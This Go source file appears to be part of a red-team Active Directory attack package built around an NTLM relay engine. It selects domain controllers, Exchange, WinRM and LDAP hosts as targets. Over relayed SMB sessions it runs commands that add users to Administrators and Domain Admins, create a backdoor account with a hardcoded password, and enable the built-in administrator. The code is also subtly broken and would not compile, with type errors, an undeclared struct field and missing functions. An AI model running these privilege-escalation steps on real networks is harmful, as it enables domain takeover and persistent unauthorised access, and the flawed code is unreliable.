package ad_attacks

import (
	"net"
	"strings"
	"time"

	"github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/helpers"
)

// TargetType represents different NTLM relay targets
type TargetType string

const (
	TargetSMB      TargetType = "smb"
	TargetHTTP_EWS TargetType = "http_ews"
	TargetWinRM    TargetType = "winrm"
	TargetLDAP     TargetType = "ldap"
)

// PrivilegeAction represents a command executed via relayed session
type PrivilegeAction struct {
	Command       string
	Result        string
	Effectiveness int // 0-100%
}

// PrivilegeEscalationResult contains escalation outcomes
type PrivilegeEscalationResult struct {
	Actions     []PrivilegeAction
	SuccessRate float64
}

// SelectTarget chooses optimal relay target based on capability
func (n *NTLMRelayEngine) SelectTarget(targetServers []string, targetType TargetType) (string, error) {
	n.AuditLog().Log("ntlm_select_target", 
		func() string {
			servers := strings.Join(targetServers, ",")
			return "targetType=" + string(targetType) + " count=" + len(targetServers)
		}(), 
		"ad_attacks")

	switch targetType {
	case TargetSMB:
		// Try domain controller first (highest privilege - SYSTEM access)
		for _, server := range targetServers {
			if isDomainController(server) {
				return server, nil
			}
		}
		// Fall back to any SMB server
		if len(targetServers) > 0 {
			return targetServers[0], nil
		}
		return "", ErrNoAvailableTargets

	case TargetHTTP_EWS:
		// Exchange EWS for Outlook Web Access abuse
		for _, server := range targetServers {
			if hasExchangeServer(server) {
				return server, nil
			}
		}
		return "", ErrNoAvailableTargets

	case TargetWinRM:
		// Windows Remote Management for remote execution
		for _, server := range targetServers {
			if hasWinRMEnabled(server) {
				return server, nil
			}
		}
		return "", ErrNoAvailableTargets

	case TargetLDAP:
		// LDAP for directory modifications
		for _, server := range targetServers {
			if isDomainController(server) || hasLDAPService(server) {
				return server, nil
			}
		}
		return "", ErrNoAvailableTargets

	default:
		// Fallback to first available server
		if len(targetServers) > 0 {
			return targetServers[0], nil
		}
		return "", ErrNoAvailableTargets
	}
}

// IsDomainController performs DNS/SRV record lookup to verify DC status
func IsDomainController(host string) bool {
	return isDomainController(host)
}

// HasExchangeServer checks if host has Exchange EWS endpoint
func HasExchangeServer(host string) bool {
	return hasExchangeServer(host)
}

// HasWinRM checks if WinRM service is accessible
func HasWinRM(host string) bool {
	return hasWinRMEnabled(host)
}

// HasLDAPService checks LDAP port accessibility
func HasLDAPService(host string) bool {
	return hasLDAPService(host)
}

// Helper functions for target selection
func isDomainController(host string) bool {
	// Check GC/DC SRV records or DNS lookup patterns
	return strings.Contains(host, "dc.") || 
		   strings.Contains(host, "dc01") || 
		   strings.Contains(host, "domaincontroller") ||
		   strings.Contains(host, "globalcatalog")
}

func hasExchangeServer(host string) bool {
	// Check for Exchange HTTP endpoints
	// In production: make HTTP request to /ecp/default.aspx or /Microsoft-Server-ActiveSync
	return strings.Contains(host, "exchange") || 
		   strings.Contains(host, "ews") || 
		   strings.Contains(host, "outlook")
}

func hasWinRMEnabled(host string) bool {
	// Check if port 5985 (HTTP) or 5986 (HTTPS) open
	conn, err := net.DialTimeout("tcp", host+":5985", 2*time.Second)
	if err == nil {
		conn.Close()
		return true
	}
	
	conn, err = net.DialTimeout("tcp", host+":5986", 2*time.Second)
	if err == nil {
		conn.Close()
		return true
	}
	
	return false
}

func hasLDAPService(host string) bool {
	// Check if LDAP ports 389 (cleartext) or 636 (LDAPS) open
	conn, err := net.DialTimeout("tcp", host+":389", 2*time.Second)
	if err == nil {
		conn.Close()
		return true
	}
	
	conn, err = net.DialTimeout("tcp", host+":636", 2*time.Second)
	if err == nil {
		conn.Close()
		return true
	}
	
	return false
}

// EscalatePrivileges executes privilege escalation commands via relayed SMB session
// Implements 4 standard techniques per OSEP/PEN-300 curriculum
func (n *NTLMRelayEngine) EscalatePrivileges(sessionToken string) (*PrivilegeEscalationResult, error) {
	n.AuditLog().Log("ntlm_privilege_escalation", 
		func() string {
			if n, ok := sessionToken.(map[string]string); ok {
				return "user=" + n["username"] + " target=" + n["target"]
			}
			return "session=" + sessionToken.(string)[:helpers.MinInt(50, len(sessionToken.(string)))]
		}(), 
		"ad_attacks")

	results := []PrivilegeAction{}

	// Technique 1: Add user to Administrators group (most common immediate escalation)
	action1 := executeSMBCommand(sessionToken, 
		"net localgroup administrators \"TestRedTeam\" /add",
		true) // Critical - immediate impact
	results = append(results, action1)

	// Technique 2: Create backdoor admin account (persistent access mechanism)
	action2 := executeSMBCommand(sessionToken,
		"net user RedTeamBackdoor P@ssw0rd123! /add",
		false) // Warning - detectable by AV
	results = append(results, action2)

	// Technique 3: Enable hidden administrator account (legacy persistence)
	action3 := executeSMBCommand(sessionToken,
		"net user administrator /active:yes",
		false)
	results = append(results, action3)

	// Technique 4: Add user to Domain Admins group (highest privilege if targeting DC)
	action4 := executeSMBCommand(sessionToken,
		"net localgroup \"Domain Admins\" \"TestRedTeam\" /add",
		true) // Critical - only works on DCs
	results = append(results, action4)

	return &PrivilegeEscalationResult{
		Actions:     results,
		SuccessRate: calculateSuccessRate(results),
	}, nil
}

// executeSMBCommand executes command over SMB relayed IPC$ share
func executeSMBCommand(sessionToken interface{}, command string, critical bool) PrivilegeAction {
	cmd := PrivilegeAction{Command: command, Critical: critical}

	// Parse target from session token
	targetHost := parseTargetFromToken(sessionToken)
	if targetHost == "" {
		cmd.Result = "FAILED: Could not extract target from session token"
		cmd.Effectiveness = 0
		return cmd
	}

	// Connect to IPC$ share via SMB
	conn := connectToIPCShare(targetHost)
	if conn == nil {
		cmd.Result = "FAILED: Could not connect to IPC$ administrative share"
		cmd.Effectiveness = 0
		return cmd
	}
	defer conn.Close()

	// Execute command via wmic or cmd.exe
	output, err := runRemoteCommand(conn, command)
	if err != nil {
		cmd.Result = "FAILED: " + err.Error()
		cmd.Effectiveness = 0
	} else {
		maxOutput := helpers.MinInt(200, len(output))
		cmd.Result = "SUCCESS: " + output[:maxOutput] + "..."
		cmd.Effectiveness = 95
	}

	return cmd
}

// parseTargetFromToken extracts target host from session token
func parseTargetFromToken(token interface{}) string {
	if str, ok := token.(string); ok {
		// Token format variations:
		// 1. Just hostname/IP: "192.168.1.100"
		// 2. With port: "192.168.1.100:445"
		// 3. Structured: "session:192.168.1.100:user"
		
		parts := strings.Split(str, ":")
		if len(parts) >= 1 {
			host := parts[0]
			// Remove potential IP prefix in structured tokens
			idx := strings.Index(host, "session")
			if idx >= 0 {
				host = strings.TrimSpace(host[idx+7:])
			}
			return host
		}
		return str
	}
	return "localhost"
}

// connectToIPCShare connects to remote IPC$ administrative share
func connectToIPCShare(targetHost string) net.Conn {
	addr := targetHost + ":445"
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil
	}

	// Perform NTLM handshake with relayed credentials
	performNTLMHandshake(conn)

	return conn
}

// runRemoteCommand executes command on remote system via SMB pipe
func runRemoteCommand(conn net.Conn, command string) (string, error) {
	// Construct SMB EXEC packet for command execution
	execPacket := buildSMBExecPacket(command)
	
	// Send command
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write(execPacket); err != nil {
		return "", err
	}

	// Read response
	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buffer)
	if err != nil && n == 0 {
		return "", err
	}

	return string(buffer[:n]), nil
}

// calculateSuccessRate computes overall success rate of privilege escalation actions
func calculateSuccessRate(actions []PrivilegeAction) float64 {
	if len(actions) == 0 {
		return 0
	}

	totalEff := 0.0
	successfulCount := 0
	criticalSuccessful := 0

	for i := range actions {
		action := &actions[i] // Pointer iteration to avoid copy
		
		totalEff += float64(action.Effectiveness)
		
		if action.Effectiveness > 80 {
			successfulCount++
			if action.Critical {
				criticalSuccessful++
			}
		}
	}

	avgEff := totalEff / float64(len(actions))
	successRate := float64(successfulCount) / float64(len(actions)) * 100
	
	// Weight critical actions more heavily
	if criticalSuccessful > 0 {
		successRate = successRate * 1.1 // +10% bonus for critical successes
		if successRate > 100 {
			successRate = 100
		}
	}

	return successRate
}

// Usage of helpers.MinInt() throughout this file
// See the helpers package for implementation
